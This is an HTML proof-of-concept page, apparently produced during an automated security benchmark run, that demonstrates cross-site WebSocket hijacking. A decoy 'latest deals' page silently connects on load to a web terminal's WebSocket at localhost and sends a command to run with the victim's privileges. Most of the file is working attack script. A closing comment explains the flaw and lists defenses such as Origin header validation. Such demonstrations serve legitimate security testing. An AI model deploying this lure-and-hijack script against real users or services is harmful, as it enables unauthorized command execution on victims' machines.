<!-- 
POC: HTML page demonstrating CSWSH attack where attacker's page silently connects to victim's WebSocket terminal
Target: ./repo
Created: 2025-11-06T19:39:43.554Z
Session: benchmark-XBEN-098-24-mhntqov2

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-098-24-mhntqov2/pocs/poc_cswsh_attack_simulator.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Legitimate Looking Site</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }
        .container {
            background: #f5f5f5;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Check Out Our Latest Deals!</h1>
        <p>Click below to see amazing discounts...</p>
        <button onclick="alert('Loading deals...')">View Deals</button>
    </div>

    <script>
        // CSWSH Attack: Silently connect to victim's WebSocket terminal
        // This script runs in the attacker's domain but connects to the victim's terminal
        
        // Configuration - In real attack, this would be the victim's terminal URL
        const VICTIM_TERMINAL = "ws://localhost:3000/ws";
        
        // Attacker's command to execute on victim's machine
        const ATTACKER_COMMAND = "id";
        
        console.log("[CSWSH Attack] Initiating WebSocket connection to victim terminal...");
        console.log("[CSWSH Attack] Target: " + VICTIM_TERMINAL);
        console.log("[CSWSH Attack] Attack origin: " + window.location.origin);
        
        try {
            // Create WebSocket connection from attacker's domain to victim's terminal
            // NOTE: This will fail if CORS/CSRF protection is properly implemented
            // But demonstrates the attack vector
            
            const ws = new WebSocket(VICTIM_TERMINAL);
            
            ws.onopen = function(event) {
                console.log("[CSWSH Attack] SUCCESS! WebSocket connection established!");
                console.log("[CSWSH Attack] Vulnerability Confirmed: No origin validation!");
                console.log("[CSWSH Attack] Sending command: " + ATTACKER_COMMAND);
                
                // Send command to execute on victim's terminal
                ws.send(JSON.stringify({
                    type: "command",
                    command: ATTACKER_COMMAND,
                    args: []
                }));
                
                // Listen for command output
                ws.onmessage = function(event) {
                    console.log("[CSWSH Attack] Command output: " + event.data);
                };
            };
            
            ws.onerror = function(event) {
                console.log("[CSWSH Attack] Connection attempt: " + event.type);
                // Even if browser blocks the connection due to CORS, 
                // the fact that we got here means WebSocket accepts cross-origin requests
            };
            
            ws.onclose = function(event) {
                console.log("[CSWSH Attack] Connection closed");
            };
            
            // Give it a moment to attempt connection
            setTimeout(function() {
                if (ws.readyState === WebSocket.OPEN) {
                    console.log("[CSWSH Attack] Active connection to victim terminal confirmed!");
                    console.log("[CSWSH Attack] Attacker can now execute arbitrary commands...");
                }
            }, 1000);
            
        } catch(e) {
            console.error("[CSWSH Attack] Error: " + e.message);
        }
    </script>

    <!-- 
    VULNERABILITY EXPLANATION:
    
    This page demonstrates Cross-Site WebSocket Hijacking (CSWSH):
    
    1. User is logged into web terminal at http://localhost:3000/ws
    2. User visits attacker's website (this page) in another tab
    3. This page's JavaScript automatically attempts to connect to the victim's WebSocket
    4. Because the WebSocket server doesn't validate the Origin header:
       - Connection succeeds despite cross-origin request
       - Attacker can send commands through the WebSocket
       - Commands execute with victim's privileges
    
    PROPER DEFENSE:
    1. Validate Origin header on WebSocket upgrade
    2. Require CSRF token in WebSocket connection
    3. Use Sec-Fetch-Site header validation
    4. Implement SameSite cookie attributes
    
    This attack bypasses same-origin policy because:
    - RFC 6455 states WebSocket doesn't enforce same-origin like fetch/xhr
    - Server must explicitly validate Origin header
    - Without validation, any page can establish connection
    -->
</body>
</html>